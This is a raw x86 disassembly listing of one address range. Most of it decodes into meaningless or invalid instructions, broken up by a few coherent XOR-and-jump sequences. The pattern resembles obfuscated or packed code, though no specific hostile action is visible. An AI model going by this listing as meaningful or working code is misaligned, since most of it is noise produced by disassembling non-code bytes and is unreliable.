  415087:	push   esi
  415088:	jo     0x41508c
  41508a:	push   ds
  41508b:	lods   eax,DWORD PTR ds:[esi]
  41508c:	xor    al,0x14
  41508e:	mov    cl,0x6f
  415090:	cmp    al,BYTE PTR [edx+0x5a]
  415093:	icebp  
  415094:	xor    BYTE PTR [esi-0x2b],cl
  415097:	pop    ss
  415098:	dec    esi
  415099:	mov    dh,0xa2
  41509b:	ds xchg edi,eax
  41509d:	lea    edx,[esi+0x26f3e62]
  4150a3:	in     eax,0x9d
  4150a5:	cli    
  4150a6:	mov    DWORD PTR [ecx],ecx
  4150a8:	inc    edx
  4150a9:	in     al,0x4d
  4150ab:	push   esp
  4150ac:	aam    0xab
  4150ae:	loopne 0x415066
  4150b0:	and    eax,0x65ca2478
  4150b5:	leave  
  4150b6:	sbb    eax,0x2dd35657
  4150bb:	mov    edx,0x792f5bee
  4150c0:	test   eax,0x227c52fa
  4150c5:	mov    ah,0x5
  4150c7:	aaa    
  4150c8:	cs or  eax,0xfa654433
  4150ce:	push   esp
  4150cf:	sub    DWORD PTR [esi+0x5d718ad3],ecx
  4150d5:	test   eax,0x80699a14
  4150da:	mov    ebx,0x54bcb1c9
  4150df:	dec    ebx
  4150e0:	mov    ecx,0xa0f86ff3
  4150e5:	std    
  4150e6:	sub    al,0xce
  4150e8:	xor    BYTE PTR [edx-0x1df555bf],ah
  4150ee:	cli    
  4150ef:	es mov ebx,0x7a24f469
  4150f5:	and    BYTE PTR [esi-0x7c],dh
  4150f8:	xor    ah,BYTE PTR [ecx+0x32d33654]
  4150fe:	sti    
  4150ff:	mov    DWORD PTR [edx+0x75],ebp
  415102:	out    dx,eax
  415103:	jle    0x415120
  415105:	or     DWORD PTR [eax+eax*2+0x584dff6],edx
  41510c:	pop    ecx
  41510d:	push   ss
  41510e:	pop    ss
  41510f:	(bad)  
  415110:	push   esp
  415111:	rcl    BYTE PTR [ebp-0x70f73f42],1
  415117:	dec    eax
  415118:	lock call 0x9ba9:0x6772633a
  415120:	repz fst st(4)
  415123:	fidivr DWORD PTR [edx]
  415125:	mov    ah,0xc
  415127:	aas    
  415128:	cwde   
  415129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41512a:	pop    ss
  41512b:	push   0x424944ac
  415130:	xlat   BYTE PTR ds:[ebx]
  415131:	daa    
  415132:	push   ebp
  415133:	jae    0x4150f8
  415135:	and    BYTE PTR [esi+0x6cacebfe],0x3c
  41513c:	adc    edi,DWORD PTR [esi]
  41513e:	aad    0xe0
  415140:	(bad)  
  415141:	cmp    dh,BYTE PTR [edx-0x30]
  415144:	cmc    
  415145:	mov    BYTE PTR [ebp+0x434cea55],ah
  41514b:	pop    ebp
  41514c:	add    al,0x45
  41514e:	sub    esp,DWORD PTR ds:0xbdb508b0
  415154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415156:	mov    dl,BYTE PTR [eax]
  415158:	mov    esi,0x7eb6f8af
  41515d:	fs (bad) 
  41515f:	out    0x9,eax
  415161:	jecxz  0x41518b
  415163:	pop    ecx
  415164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415165:	sub    dh,BYTE PTR [edx-0x5f39b56]
  41516b:	leave  
  41516c:	jecxz  0x41513f
  41516e:	inc    edi
  41516f:	cmp    dh,BYTE PTR [edi+0x69]
  415172:	aad    0x87
  415174:	push   eax
  415175:	popa   
  415176:	sub    eax,0x12928a7b
  41517b:	sbb    al,0x42
  41517d:	pushf  
  41517e:	pop    ds
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fldenv [edx]
  4151a5:	pop    es
  4151a6:	jmp    0xb970:0x7f05ed36
  4151ad:	jle    0x41521f
  4151af:	jo     0x415164
  4151b1:	xor    esi,DWORD PTR [ecx+0x32d741d0]
  4151b7:	mov    ecx,0x841c83c2
  4151bc:	loope  0x41520d
  4151be:	pop    ss
  4151bf:	in     al,dx
  4151c0:	pop    ds
  4151c1:	lahf   
  4151c2:	mov    ecx,DWORD PTR [ebp+0x4c8bffcb]
  4151c8:	enter  0xad44,0xee
  4151cc:	sbb    BYTE PTR [eax],al
  4151ce:	xchg   esi,eax
  4151cf:	adc    DWORD PTR [eax],ebp
  4151d1:	push   edx
  4151d2:	in     eax,0xc2
  4151d4:	or     ch,BYTE PTR [eax]
  4151d6:	dec    esi
  4151d7:	neg    BYTE PTR [eax+esi*1]
  4151da:	cmp    eax,0xa56d7a74
  4151df:	out    0x16,al
  4151e1:	fwait
  4151e2:	cmp    eax,0x72d17b9a
  4151e7:	push   eax
  4151e8:	aas    
  4151e9:	pop    edi
  4151ea:	pop    es
  4151eb:	mov    edx,?
  4151ed:	add    ah,BYTE PTR [ebx-0xdd6e809]
  4151f3:	jmp    0x41522f
  4151f5:	aad    0xd6
  4151f7:	stos   DWORD PTR es:[edi],eax
  4151f8:	sahf   
  4151f9:	repnz pop esi
  4151fb:	mov    eax,0xb9973d89
  415200:	lea    esi,[ebx-0x1d918453]
  415206:	popa   
  415207:	mov    edi,eax
  415209:	add    ecx,ebx
  41520b:	push   ebx
  41520c:	jbe    0x415222
  41520e:	(bad)  
  415210:	push   cs
  415211:	idiv   DWORD PTR [ecx]
  415213:	pushf  
  415214:	mov    ds:0x7868f5e7,ax
  41521a:	adc    al,0xc1
  41521c:	dec    eax
  41521d:	scas   eax,DWORD PTR es:[edi]
  41521e:	outs   dx,DWORD PTR ds:[esi]
  41521f:	sub    bl,BYTE PTR [edi+esi*8]
  415222:	aaa    
  415223:	lar    ecx,WORD PTR [edx]
  415226:	cmp    DWORD PTR [esi+0x7566df3b],edi
  41522c:	(bad)  
  41522d:	retf   0x438e
  415230:	mov    WORD PTR [edi],es
  415232:	(bad)  
  415233:	fcmovbe st,st(4)
  415235:	add    ah,bh
  415237:	pop    ebp
  415238:	add    edi,DWORD PTR [esi]
  41523a:	inc    ecx
  41523b:	xchg   edx,eax
  41523c:	iret   
  41523d:	sbb    BYTE PTR ds:0xbb0f7547,0x8d
  415244:	jbe    0x415263
  415246:	inc    edx
  415247:	lods   al,BYTE PTR ds:[esi]
  415248:	sbb    al,0x77
  41524a:	push   0xffffffe3
  41524c:	icebp  
  41524d:	and    ebp,DWORD PTR fs:[eax+0x39]
  415251:	retf   0xff6d
  415254:	in     al,dx
  415255:	ror    DWORD PTR [edi+0x18],1
  415258:	fisttp WORD PTR [ebp+0x5b3c399c]
  41525e:	icebp  
  41525f:	iret   
  415260:	cmp    ah,BYTE PTR [eax]
  415262:	mov    esp,DWORD PTR [ecx+eiz*4+0x7ee8bae]
  415269:	pop    ss
  41526a:	jmp    0x9dc41aaf
  41526f:	sub    al,dl
  415271:	xchg   ebp,eax
  415272:	ficom  DWORD PTR [edi-0x75]
  415275:	retf   0x291b
  415278:	bnd jnp 0x415259
  41527b:	sbb    bh,cl
  41527d:	push   ss
  41527e:	or     al,0x30
  415280:	mov    ebx,0xf3bfec21
  415285:	mov    ds:0xbcb33dae,eax
  41528a:	jnp    0x41528e
  41528c:	popa   
  41528d:	mov    al,ds:0x9a61b5d6
  415292:	stos   BYTE PTR es:[edi],al
  415293:	push   eax
  415294:	in     al,0xfd
  415296:	pop    ecx
  415297:	xlat   BYTE PTR ds:[ebx]
  415298:	cld    
  415299:	daa    
  41529a:	(bad)  
  41529b:	xor    esi,DWORD PTR [ebx]
  41529d:	repnz (bad) 
  41529f:	mov    eax,ds:0x257076f5
  4152a4:	aad    0x34
  4152a6:	iret   
  4152a7:	loope  0x415252
  4152a9:	stos   BYTE PTR es:[edi],al
  4152aa:	mov    dh,0xa4
  4152ac:	clc    
  4152ad:	jmp    0x415262
  4152af:	std    
  4152b0:	mov    edx,0xb3d4bfaa
  4152b5:	and    ebx,DWORD PTR [esi-0x41]
  4152b8:	add    eax,0x99023b8
  4152bd:	cmc    
  4152be:	xchg   edx,eax
  4152bf:	out    dx,al
  4152c0:	push   cs
  4152c1:	mov    ?,WORD PTR [ecx]
  4152c3:	out    0x15,al
  4152c5:	aas    
  4152c6:	mov    dh,ah
  4152c8:	outs   dx,BYTE PTR ds:[esi]
  4152c9:	adc    bh,BYTE PTR [ebp+eax*4+0x17]
  4152cd:	sar    BYTE PTR [ecx],cl
  4152cf:	dec    edi
  4152d0:	pop    edi
  4152d1:	inc    esi
  4152d2:	sbb    ebp,DWORD PTR ds:[ebp-0xf]
  4152d6:	and    ah,bl
  4152d8:	jmp    DWORD PTR [esi]
  4152da:	jae    0x4152a8
  4152dc:	out    0xb4,al
  4152de:	mov    BYTE PTR [ecx-0x1c],al
  4152e1:	dec    ecx
  4152e2:	(bad)  
  4152e3:	ret    0x3eb3
  4152e6:	ror    dh,1
  4152e8:	ror    BYTE PTR [esi+0x35],1
  4152eb:	imul   esi,DWORD PTR [edx+0x2cb88855],0xe0a65b8e
  4152f5:	iret   
  4152f6:	dec    esp
  4152f7:	jae    0x4152e9
  4152f9:	imul   ebp
  4152fb:	loop   0x41529e
  4152fd:	mov    esi,0x3082153a
  415302:	call   0x3c91dd96
  415307:	and    eax,0x55401dbe
  41530c:	scas   al,BYTE PTR es:[edi]
  41530d:	jg     0x4152f8
  41530f:	or     eax,0xb9a9dfd3
  415314:	loop   0x4152bf
  415316:	xor    bh,dh
  415318:	inc    ebp
  415319:	sbb    al,0x23
  41531b:	pop    edx
  41531c:	rcr    DWORD PTR [ebx],cl
  41531e:	inc    edx
  41531f:	mov    WORD PTR [eax-0x642e082a],?
  415325:	pop    eax
  415326:	mov    ?,WORD PTR [ecx-0x11]
  415329:	out    dx,eax
  41532a:	shr    BYTE PTR [ebp-0x6d],cl
  41532d:	add    BYTE PTR [ebp+0x11dc1278],dh
  415333:	xchg   esp,eax
  415334:	jmp    0x124f:0x1aa70113
  41533b:	rcr    BYTE PTR [edi+0x2744df2b],1
  415341:	div    DWORD PTR [ebx+0x3c8b5746]
  415347:	test   BYTE PTR [esi],dh
  415349:	xchg   esp,eax
  41534a:	pop    eax
  41534b:	pusha  
  41534c:	pushf  
  41534d:	int    0xaa
  41534f:	or     eax,DWORD PTR [ecx-0x1d]
  415352:	outs   dx,BYTE PTR ds:[esi]
  415353:	add    BYTE PTR [eax+edi*8-0x1c9e9e06],ch
  41535a:	and    ebp,DWORD PTR ds:0x8958c70f
  415360:	xor    al,dh
  415362:	mov    gs,WORD PTR [ecx+0x4f40f8a5]
  415368:	pusha  
  415369:	scas   al,BYTE PTR es:[edi]
  41536a:	loopne 0x4153e0
  41536c:	lods   al,BYTE PTR ds:[esi]
  41536d:	dec    edx
  41536e:	pop    eax
  41536f:	push   ds
  415370:	mov    dh,BYTE PTR [ebp-0x6e379d5f]
  415376:	std    
  415377:	mov    cl,0x70
  415379:	adc    al,0x2d
  41537b:	retf   
  41537c:	int3   
  41537d:	bound  edi,QWORD PTR [edi]
  41537f:	pop    ebp
  415380:	inc    esi
  415381:	push   cs
  415382:	fcmovnbe st,st(5)
  415384:	jo     0x415356
  415386:	dec    eax
  415387:	rcr    BYTE PTR [eax],0x13
  41538a:	push   cs
  41538b:	push   ss
  41538c:	hlt    
  41538d:	xor    ecx,DWORD PTR [edi+0xacf32e9]
  415393:	dec    esp
  415394:	stos   DWORD PTR es:[edi],eax
  415395:	sti    
  415396:	and    DWORD PTR [edi],ebx
  415398:	mov    dl,0xe3
  41539a:	jl     0x415343
  41539c:	fidivr WORD PTR [ebp-0x609fab7d]
  4153a2:	stc    
  4153a3:	xchg   edx,eax
  4153a4:	sub    al,0x55
  4153a6:	dec    eax
  4153a7:	ficom  WORD PTR [edx-0x73]
  4153aa:	mov    eax,DWORD PTR [ebp+0x6d]
  4153ad:	sbb    eax,0x931f4598
  4153b2:	popf   
  4153b3:	in     eax,dx
  4153b4:	xchg   BYTE PTR [ebp-0x5],bl
  4153b7:	ror    DWORD PTR [ebx-0x424efaa0],cl
  4153bd:	cld    
  4153be:	shr    edi,0x88
  4153c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153c2:	fmul   QWORD PTR [edx]
  4153c4:	pop    edx
  4153c5:	push   esi
  4153c6:	(bad)  
  4153c7:	mov    ds:0x6be3659a,al
  4153cc:	in     eax,dx
  4153cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ce:	mov    bh,0x50
  4153d0:	leave  
  4153d1:	mov    esp,0xe6309aaa
  4153d6:	and    bl,al
  4153d8:	cdq    
  4153d9:	and    eax,0x2afbba7f
  4153de:	aaa    
  4153df:	sub    al,0xac
  4153e1:	aas    
  4153e2:	stos   DWORD PTR es:[di],eax
  4153e4:	call   0xc5f6e91f
  4153e9:	mov    bh,0x1b
  4153eb:	mov    ebx,0x2ef5dd18
  4153f0:	cmp    eax,DWORD PTR [edi]
  4153f2:	iret   
  4153f3:	test   eax,0x5d270b51
  4153f8:	jno    0x415475
  4153fa:	cmc    
  4153fb:	add    DWORD PTR [esi],esp
  4153fd:	pop    esp
  4153fe:	add    eax,0xcd84e96e
  415403:	pop    ds
  415404:	jmp    0x11f8ad1e
  415409:	mov    ebp,0x785dd69a
  41540e:	push   ss
  41540f:	dec    esp
  415410:	jmp    0xb113:0x8c9a1d37
  415417:	ins    BYTE PTR es:[edi],dx
  415418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415419:	xor    eax,0xbff4035b
  41541e:	and    DWORD PTR ds:0xd9391d00,ecx
  415424:	and    BYTE PTR [ebp+0x9],bh
  415427:	mov    cl,BYTE PTR [ecx]
  415429:	and    BYTE PTR [ecx+ecx*2+0x6a],ch
  41542d:	inc    eax
  41542e:	mov    DWORD PTR [edi],edx
  415430:	in     ax,dx
  415432:	lock inc eax
  415434:	(bad)  [esi-0x52]
  415437:	out    dx,eax
  415438:	add    BYTE PTR [ebx-0xf],dl
  41543b:	test   al,0x67
  41543d:	jmp    0x62ddd760
  415442:	and    ecx,DWORD PTR [ecx+0x41150cb0]
  415448:	ror    BYTE PTR [esi],1
  41544a:	dec    edx
  41544b:	pop    esi
  41544c:	sbb    eax,0x1b50d554
  415451:	sbb    eax,0xa8f4f0cc
  415456:	stc    
  415457:	xchg   ebx,eax
  415458:	shr    DWORD PTR [edi+edx*2+0x2c],cl
  41545c:	dec    edi
  41545d:	(bad)  
  41545e:	mov    ebp,0x35a0013a
  415463:	xor    al,0x70
  415465:	mov    al,0x21
  415468:	call   0x2ca9:0xd569d857
  41546f:	fst    DWORD PTR [ecx]
  415471:	xchg   ebp,eax
  415472:	cs mov edi,0x3369e47
  415478:	ret    0x4589
  41547b:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x8f
  4154c8:	div    bl
  4154ca:	sti    
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0xb170707e
  4154d4:	dec    edi
  4154d5:	lea    edi,[edi]
  4154d7:	retf   
  4154d8:	xchg   edi,eax
  4154d9:	in     eax,dx
  4154da:	add    ebp,0x28
  4154dd:	dec    edx
  4154de:	inc    edx
  4154df:	(bad)
  4154e2:	fistp  QWORD PTR [eax]
  4154e4:	mov    bh,0x9a
  4154e6:	popa   
  4154e7:	pop    esp
  4154e8:	shl    ecx,1
  4154ea:	nop
  4154eb:	sub    ch,BYTE PTR [eax+0x548fb6f8]
  4154f1:	int3   
  4154f2:	inc    ebp
  4154f3:	test   DWORD PTR [ecx+esi*8-0x7805f907],esi
  4154fa:	xchg   ebx,eax
  4154fb:	gs test eax,0x84c2932d
  415501:	jl     0x4154cb
  415503:	mov    DWORD PTR [eax+0x34c2367e],edi
  415509:	xchg   ecx,eax
  41550a:	push   cs
  41550b:	(bad)  [edi]
  41550d:	inc    edx
  41550e:	sbb    esi,edi
  415510:	cmp    DWORD PTR [ebx-0x58],0xffffffee
  415514:	imul   esi,DWORD PTR [eax],0xffffffd9
  415517:	sub    DWORD PTR [ebp-0x275aee83],ebx
  41551d:	jno    0x415566
  41551f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415520:	aam    0x6c
  415522:	mov    DWORD PTR [ecx],ecx
  415524:	cmp    ecx,DWORD PTR ds:0x81d4b28d
  41552a:	cmp    esi,ebp
  41552c:	sbb    BYTE PTR [edi-0x50],dh
  41552f:	bound  ebp,QWORD PTR ds:0x5b23c260
  415535:	xchg   esp,eax
  415536:	sbb    al,0x77
  415538:	stos   BYTE PTR es:[edi],al
  415539:	push   esp
  41553a:	sbb    edx,DWORD PTR [edx]
  41553c:	lods   eax,DWORD PTR ds:[esi]
  41553d:	fstp   QWORD PTR [esi+ebp*8]
  415540:	xor    dl,BYTE PTR [ebp+0x6e]
  415543:	pop    esp
  415544:	sub    DWORD PTR [eax+0x71],edi
  415547:	and    DWORD PTR [eax],0x58
  41554a:	mov    ecx,0xef52662c
  41554f:	jb     0x41555b
  415551:	mov    eax,0x5d4beaf5
  415556:	and    ebp,edi
  415558:	lea    ebx,[ecx+ecx*1-0x289fddcd]
  41555f:	push   0xffffff97
  415561:	push   0xffffffff
  415563:	aas    
  415564:	ss inc esi
  415566:	jnp    0x4154f9
  415568:	sub    DWORD PTR [ebx-0xe57a3c2],0xc
  41556f:	push   ebx
  415570:	jp     0x41559e
  415572:	inc    esp
  415573:	mov    ds:0xc893c0a6,eax
  415578:	mov    ds:0x238471b6,al
  41557d:	inc    esp
  41557e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41557f:	popa   
  415580:	jp     0x41556e
  415582:	mov    esp,0xa56e0e1f
  415587:	push   0xdbfb42ba
  41558c:	jg     0x415547
  41558e:	xor    DWORD PTR [ebx],esi
  415590:	lea    edx,[eax+0x265bbaf]
  415596:	xor    BYTE PTR [ebp-0x54045c7d],0xd8
  41559d:	(bad)  
  41559e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41559f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155a0:	loop   0x415574
  4155a2:	and    BYTE PTR [esi+eiz*8],0x86
  4155a6:	xchg   esp,eax
  4155a7:	pop    ecx
  4155a8:	sar    BYTE PTR [esi+ecx*8-0x5d82336a],cl
  4155af:	mov    ds:0xea4f97f7,al
  4155b4:	mov    al,ds:0x7e221401
  4155b9:	sub    al,0x10
  4155bb:	sbb    ah,BYTE PTR [ebp+0x43af2961]
  4155c1:	jbe    0x4155e9
  4155c3:	add    eax,DWORD PTR [esi-0x30]
  4155c6:	push   esp
  4155c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155c8:	(bad)  
  4155c9:	mov    ch,0x1f
  4155cb:	bound  esi,QWORD PTR ds:0xfff6779f
  4155d1:	mov    WORD PTR [esi-0x7d2941a0],cs
  4155d7:	cmc    
  4155d8:	bound  ebp,QWORD PTR [esi]
  4155da:	sub    al,0xa
  4155dc:	dec    eax
  4155dd:	out    dx,eax
  4155de:	add    al,0x16
  4155e0:	(bad)  
  4155e1:	fistp  WORD PTR [edx+ebx*4-0x75]
  4155e5:	mov    DWORD PTR [ebx],ebp
  4155e7:	lea    ecx,[esi]
  4155e9:	or     DWORD PTR [edi],edx
  4155eb:	retf   
  4155ec:	xor    eax,0xd3bf2ef5
  4155f1:	out    dx,al
  4155f2:	dec    ecx
  4155f3:	push   eax
  4155f4:	arpl   di,cx
  4155f6:	push   esp
  4155f7:	push   eax
  4155f8:	and    cl,BYTE PTR [esi-0x4e]
  4155fb:	paddsb mm4,QWORD PTR [esi]
  4155fe:	fdivr  st,st(4)
  415600:	jmp    0x92b4987e
  415605:	sbb    ebp,ebp
  415607:	inc    ebp
  415608:	xor    BYTE PTR [ebp+0x1ba02861],0x6e
  41560f:	imul   ebx,DWORD PTR [eax],0xffffffda
  415612:	jae    0x4155dc
  415614:	pop    es
  415615:	xchg   edi,eax
  415616:	and    al,0xc
  415618:	fwait
  415619:	repnz sub al,0x30
  41561c:	sub    ecx,eax
  41561e:	ror    BYTE PTR [edx+0x13b043e8],0x44
  415625:	jbe    0x41564e
  415627:	neg    DWORD PTR [edx]
  415629:	cmp    eax,0x13e7239a
  41562e:	add    esi,DWORD PTR [esi+0x2e]
  415631:	cdq    
  415632:	dec    edx
  415633:	ins    DWORD PTR es:[edi],dx
  415634:	into   
  415635:	ss and bh,bh
  415638:	stos   DWORD PTR es:[edi],eax
  415639:	mov    edx,0x8c43dcc4
  41563e:	lahf   
  41563f:	mov    edi,0x8cb94748
  415644:	(bad)  
  415645:	xor    dl,BYTE PTR ds:0xc7eb8e23
  41564b:	adc    dl,ch
  41564d:	jmp    0xfdefd66e
  415652:	aaa    
  415653:	cdq    
  415654:	mov    edi,DWORD PTR [edi+0x5a077a2e]
  41565a:	shl    esi,1
  41565c:	push   0xfffffffc
  41565e:	jbe    0x4156ca
  415660:	inc    edi
  415661:	out    0x21,al
  415663:	dec    edx
  415664:	lods   al,BYTE PTR ds:[esi]
  415665:	(bad)  
  415666:	jle    0x4156c0
  415668:	fs aas 
  41566a:	or     ah,BYTE PTR [ebx-0x3a]
  41566d:	icebp  
  41566e:	sbb    esi,DWORD PTR cs:[edi+0x7af73f80]
  415675:	push   esi
  415676:	cmp    DWORD PTR [edi+0x6e],ebx
  415679:	mov    WORD PTR [ecx],gs
  41567b:	mov    ecx,0xc1233079
  415680:	pop    esp
  415681:	stc    
  415682:	jge    0x415625
  415684:	mov    ah,0x11
  415686:	arpl   WORD PTR [eax],sp
  415688:	fucomip st,st(5)
  41568a:	cld    
  41568b:	out    dx,eax
  41568c:	mov    edx,0x3d0e016c
  415691:	jo     0x4156cf
  415693:	add    BYTE PTR [ecx],cl
  415695:	jmp    0x415685
  415697:	add    al,0x73
  415699:	cmp    eax,0xb48e9bc9
  41569e:	das    
  41569f:	lods   al,BYTE PTR ds:[esi]
  4156a0:	adc    esp,DWORD PTR [eax+0x33]
  4156a3:	lods   al,BYTE PTR ds:[esi]
  4156a4:	call   0x6664343b
  4156a9:	pop    ebx
  4156aa:	xchg   BYTE PTR [esi+0x32202bb3],dl
  4156b0:	inc    eax
  4156b1:	cmp    eax,0x337a8ac8
  4156b6:	xchg   esi,eax
  4156b7:	adc    esi,esi
  4156b9:	aam    0x88
  4156bb:	xor    eax,0x72e671a9
  4156c0:	xor    esp,DWORD PTR [ecx]
  4156c2:	xchg   ecx,eax
  4156c3:	lods   al,BYTE PTR ds:[esi]
  4156c4:	sub    BYTE PTR [edi-0x41bbf172],dh
  4156ca:	mov    dl,0x47
  4156cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156cd:	jecxz  0x4156d3
  4156cf:	pop    ss
  4156d0:	pusha  
  4156d1:	fnstenv [ecx+eiz*4+0x2d8fdfb7]
  4156d8:	jae    0x4156e5
  4156da:	repz xchg bp,ax
  4156dd:	xchg   edi,eax
  4156de:	sahf   
  4156df:	sbb    al,0x29
  4156e1:	sahf   
  4156e2:	(bad)  
  4156e4:	int    0xa0
  4156e6:	cdq    
  4156e7:	adc    al,0xa7
  4156e9:	pop    ebp
  4156ea:	add    ecx,esi
  4156ec:	daa    
  4156ed:	out    0x9b,al
  4156ef:	push   ss
  4156f0:	arpl   WORD PTR [esi+0xc],cx
  4156f3:	xchg   ecx,eax
  4156f4:	mov    cl,0xec
  4156f6:	mov    bh,0x90
  4156f8:	in     eax,0x23
  4156fa:	sbb    al,0x87
  4156fc:	xchg   esi,eax
  4156fd:	pop    eax
  4156fe:	or     ecx,edi
  415700:	dec    DWORD PTR ds:0x38ad87b2
  415706:	sub    edx,esp
  415708:	rol    DWORD PTR [edx],0x31
  41570b:	adc    cl,BYTE PTR [ebx+eax*8+0x229b39b1]
  415712:	sahf   
  415713:	js     0x4156dc
  415715:	mov    al,ds:0x1f9047f7
  41571a:	es stc 
  41571c:	sbb    eax,0x28038795
  415721:	cld    
  415722:	add    dl,BYTE PTR [ebx*4+0x3375f23c]
  415729:	add    al,0xc
  41572b:	js     0x4156be
  41572d:	xchg   ebp,eax
  41572e:	add    ebx,DWORD PTR [edx+eax*2]
  415731:	rol    BYTE PTR ds:0x7bba9ed3,0xe7
  415738:	ret    0xe7d7
  41573b:	or     BYTE PTR [ecx],0x4c
  41573e:	adc    cl,cl
  415740:	sbb    eax,0x46ce3b97
  415745:	adc    al,0x17
  415747:	jge    0x41575c
  415749:	mov    eax,0xa7568337
  41574e:	pop    ecx
  41574f:	stos   BYTE PTR es:[edi],al
  415750:	add    edx,edi
  415752:	push   0x3c57f9a9
  415757:	in     eax,dx
  415758:	push   esi
  415759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41575a:	add    dh,BYTE PTR [ecx+0x76]
  41575d:	or     DWORD PTR [eax],esi
  41575f:	loop   0x415755
  415761:	mov    ds:0xf328c20d,eax
  415766:	mov    dl,0x79
  415768:	inc    eax
  415769:	inc    esp
  41576a:	es fwait
  41576c:	cli    
  41576d:	add    ah,bh
  41576f:	loop   0x4157ec
  415771:	imul   esp,edi,0x0
  415774:	in     al,dx
  415775:	pop    ds
  415776:	ror    DWORD PTR [edx+0x1cc09acf],0xba
  41577d:	jo     0x41576d
  41577f:	mov    ch,0xb
  415781:	shr    ah,cl
  415783:	sbb    al,0xdc
  415785:	ret    0x61f8
  415788:	adc    ah,cl
  41578a:	pop    ecx
  41578b:	test   DWORD PTR gs:[eax+edi*2],esi
  41578f:	and    BYTE PTR [ebx],bl
  415791:	xchg   esi,eax
  415792:	ror    BYTE PTR [edi+0x6a9fc3b5],0xe1
  415799:	push   ss
  41579a:	mov    esi,0x32729c
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   dl,bl
  4157b8:	lahf   
  4157b9:	inc    ebp
  4157ba:	scas   eax,DWORD PTR es:[edi]
  4157bb:	jg     0x4157cc
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0xd70707e
  4157c4:	add    eax,0xb4b4ca33
  4157c9:	xchg   edx,eax
  4157ca:	sub    al,0xd2
  4157cc:	add    BYTE PTR [eax+0x2f359571],ah
  4157d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157d3:	jns    0x4157c8
  4157d5:	nop
  4157d6:	cmp    eax,0xc77d1c4f
  4157db:	inc    ecx
  4157dc:	inc    ebp
  4157dd:	addr16 inc esp
  4157df:	lahf   
  4157e0:	xor    eax,0x5f45793c
  4157e5:	les    ecx,FWORD PTR [ecx+0x678e3202]
  4157eb:	pop    ds
  4157ec:	pop    ebp
  4157ed:	sbb    cl,BYTE PTR [eax-0x72cff9e8]
  4157f3:	sti    
  4157f4:	gs add al,0x15
  4157f7:	adc    cl,BYTE PTR [edx]
  4157f9:	add    dl,BYTE PTR [eax]
  4157fb:	xor    DWORD PTR [esi+0x2bc37232],ebx
  415801:	icebp  
  415802:	mov    esi,DWORD PTR [ebx+0x321a5914]
  415808:	xchg   ecx,eax
  415809:	add    edx,0x19
  41580c:	fisubr DWORD PTR [eax+0x6]
  41580f:	jle    0x415813
  415811:	sub    al,0x54
  415813:	sub    eax,0x992f824a
  415818:	ficom  DWORD PTR ds:0x42911f55
  41581e:	ret    0x8e4e
  415821:	pop    esi
  415822:	push   ecx
  415823:	cmp    ecx,0x6f26006e
  415829:	xchg   DWORD PTR [ebx],ebp
  41582b:	lods   al,BYTE PTR ds:[esi]
  41582c:	in     al,0xfb
  41582e:	idiv   ch
  415830:	mov    ah,0x99
  415832:	add    DWORD PTR [eax+esi*4+0x50],0xffffffb5
  415837:	jp     0x4157f5
  415839:	lahf   
  41583a:	lods   al,BYTE PTR ds:[esi]
  41583b:	out    dx,al
  41583c:	(bad)  
  41583d:	jmp    0x635804ed
  415842:	rcl    esp,1
  415844:	daa    
  415845:	dec    ebx
  415846:	jbe    0x4157cb
  415848:	add    eax,0xb8b724ce
  41584d:	add    ch,BYTE PTR [ebx+0x1bee21af]
  415853:	lock call 0x21dd:0x79d6e692
  41585b:	add    BYTE PTR [esi-0x37],0x9c
  41585f:	xchg   ebx,eax
  415860:	loop   0x4158c4
  415862:	cmp    BYTE PTR [edx+0x4279b3f3],bh
  415868:	je     0x415892
  41586a:	jb     0x41585a
  41586c:	xchg   ebp,eax
